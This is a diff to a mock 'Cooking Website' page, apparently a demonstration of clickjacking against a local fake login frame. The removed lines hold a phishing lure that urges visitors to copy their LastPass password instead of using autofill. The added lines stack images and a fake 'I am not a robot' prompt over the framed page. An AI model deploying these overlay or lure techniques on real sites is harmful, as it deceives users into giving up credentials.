@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html>
-    <body>
+    <body onload="wait()">
         <h1>Cooking Website</h1>
-        <p>Oh no something went wrong</p>
-        <p>please login again</p>
-        <p>due to this issue please copy and paste your password and not autofill</p>
-        <p>you can do this by right clicking on lastpass and select the "copy password" section</p>
-        <iframe height="500vh" width="100%" src="./fakebook.html"></iframe>
+        <div id="toChange"><p>Click to continue</p></div>
+        <iframe height="500vh" width="100%" src="./fakebook.html" style="z-index: 1;"></iframe>
+        <img src="images/white.jpg" height="100vh" width="100%" style="z-index: 2; background-size: 100% 100%; position: absolute; top: 15vh">
+        <img src="images/white.jpg" height="100vh" width="100%" style="z-index: 2; background-size: 100% 100%; position: absolute; top: 17vh">
+        <p onclick="" height="500vh" width="100%" style="z-index: 4; position: absolute; top: 30vh; left: 5vw; pointer-events: none;">(click) I am not a robot (click)</p>
+        <img src="images/blue.png" height="52vh" width="100%" style="z-index: 3; background-size: 100% 100%; position: absolute; top: 30vh; pointer-events: none;">
+        <img src="images/white.jpg" height="100vh" width="100%" style="z-index: 2; background-size: 100% 100%; position: absolute; top: 37vh">
+        
     </body>
     <script src="javascript/home.js"></script>
 </html>
